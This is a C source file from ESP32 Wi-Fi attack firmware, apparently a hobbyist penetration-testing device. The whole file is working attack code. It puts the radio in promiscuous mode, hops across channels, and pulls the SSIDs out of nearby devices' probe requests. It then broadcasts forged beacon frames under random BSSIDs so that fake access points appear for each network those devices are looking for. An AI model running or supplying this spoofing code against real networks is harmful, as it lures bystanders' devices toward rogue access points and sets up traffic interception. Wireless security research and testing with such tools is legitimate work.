/**
 * @file attack_probe.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @brief Sniff Probe Requests and create beacons of their ssid
 */

#include "attack_probe.h"
#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wsl_bypasser.h"
#include "attack.h"
#include "wifi_controller.h"
#include "hydra_ssd1306_display.h"

static const char* TAG = "main:attack_probe";
static esp_timer_handle_t ghost_timer_handle = NULL;
static TaskHandle_t hop_task_handle = NULL;

typedef struct {
    uint8_t ssid[32];
    uint8_t len;
    uint8_t bssid[6];
} ghost_ap_t;

#define MAX_GHOSTS 20

static ghost_ap_t discovered_ghosts[MAX_GHOSTS];
static uint8_t ghost_count = 0;


static bool extract_ssid_from_probe(wifi_promiscuous_pkt_t *pkt, uint8_t *ssid, uint8_t *len) {
    uint16_t frame_len = pkt->rx_ctrl.sig_len;
    if (frame_len <= 28) return false; 

    uint8_t *payload = pkt->payload;

    
    if (payload[0] != 0x40) return false;

    uint8_t *ptr = payload + 24;                
    uint8_t *end = payload + frame_len - 4;     

    while (ptr + 2 <= end) {
        uint8_t tag     = ptr[0];
        uint8_t tag_len = ptr[1];

      
        if (tag_len > 32 || ptr + 2 + tag_len > end) break;

        if (tag == 0x00) { 
            if (tag_len == 0) return false; 

            for (int i = 0; i < tag_len; i++) {
                if (ptr[2 + i] < 0x20 || ptr[2 + i] > 0x7E) return false;
            }
            memcpy(ssid, ptr + 2, tag_len);
            *len = tag_len;
            return true;
        }
        ptr += (2 + tag_len);
    }
    return false;
}


static void generate_random_bssid(uint8_t *bssid) {
    for (int i = 0; i < 6; i++) {
        bssid[i] = esp_random() & 0xFF;
    }
    bssid[0] |= 0x02;
    bssid[0] &= 0xFE;
}


static bool is_duplicate(uint8_t *ssid, uint8_t len) {
    for (int i = 0; i < ghost_count; i++) {
        if (discovered_ghosts[i].len == len &&
            memcmp(discovered_ghosts[i].ssid, ssid, len) == 0) {
            return true;
            }
    }
    return false;
}


static void channel_hop_task(void *pvParameters) {

    uint8_t hop_channels[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
    int idx = 0;
    while (1) {
        esp_wifi_set_channel(hop_channels[idx], WIFI_SECOND_CHAN_NONE);
        idx = (idx + 1) % sizeof(hop_channels);
        vTaskDelay(pdMS_TO_TICKS(200)); 
    }
}


static void timer_send_ghost_beacons(void *arg) {
    if (ghost_count == 0) return;


    uint8_t current_channel = 1;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);

    for (int i = 0; i < ghost_count; i++) {
        wsl_bypasser_send_beacon_frame(
            discovered_ghosts[i].bssid,
            discovered_ghosts[i].ssid,
            discovered_ghosts[i].len,
            current_channel
        );
    }
}


static void handle_probe(wifi_promiscuous_pkt_t *pkt) {
    uint8_t ssid[32];
    uint8_t ssid_len = 0;

    if (!extract_ssid_from_probe(pkt, ssid, &ssid_len)) return;
    if (ssid_len == 0 || ssid_len > 32) return;
    if (ghost_count >= MAX_GHOSTS) return;
    if (is_duplicate(ssid, ssid_len)) return;

    memcpy(discovered_ghosts[ghost_count].ssid, ssid, ssid_len);
    discovered_ghosts[ghost_count].len = ssid_len;

    generate_random_bssid(discovered_ghosts[ghost_count].bssid);

    ESP_LOGI(TAG, "👻 Ghost AP added: %.*s on channel %d", ssid_len, ssid, pkt->rx_ctrl.channel);
    oled_log(OLED_HEAD, 3, "Found: %.*s ch:%d",
             ssid_len, ssid,
             pkt->rx_ctrl.channel);

    attack_append_status_content(ssid, ssid_len);

    ghost_count++;
}

static uint8_t own_ap_mac[6];   


static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

    if (pkt->payload[0] != 0x40) return;

    // SA (Source Address) = bytes [10..15] of 802.11 MAC header
    if (memcmp(pkt->payload + 10, own_ap_mac, 6) == 0) return;

    handle_probe(pkt);
}


void attack_probe_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting Ghost Probe...");

    ghost_count = 0;
    memset(discovered_ghosts, 0, sizeof(discovered_ghosts));

 
    wifictl_get_ap_mac(own_ap_mac);

    vTaskDelay(pdMS_TO_TICKS(100));

 
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);


    if (hop_task_handle == NULL) {
        xTaskCreatePinnedToCore(channel_hop_task, "probe_hop_task", 2048, NULL, 3, &hop_task_handle, 1);
    }

    
    const esp_timer_create_args_t timer_args = {
        .callback = &timer_send_ghost_beacons,
        .name = "ghost_beacon_timer"
    };
    esp_timer_create(&timer_args, &ghost_timer_handle);
    esp_timer_start_periodic(ghost_timer_handle, 100000); 
}


void attack_probe_stop() {
    
    if (hop_task_handle != NULL) {
        vTaskDelete(hop_task_handle);
        hop_task_handle = NULL;
    }

  
    if (ghost_timer_handle != NULL) {
        if (esp_timer_is_active(ghost_timer_handle)) {
            esp_timer_stop(ghost_timer_handle);
        }
        esp_timer_delete(ghost_timer_handle);
        ghost_timer_handle = NULL;
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    ESP_LOGI(TAG, "Stopped. Ghost AP count: %d", ghost_count);
}
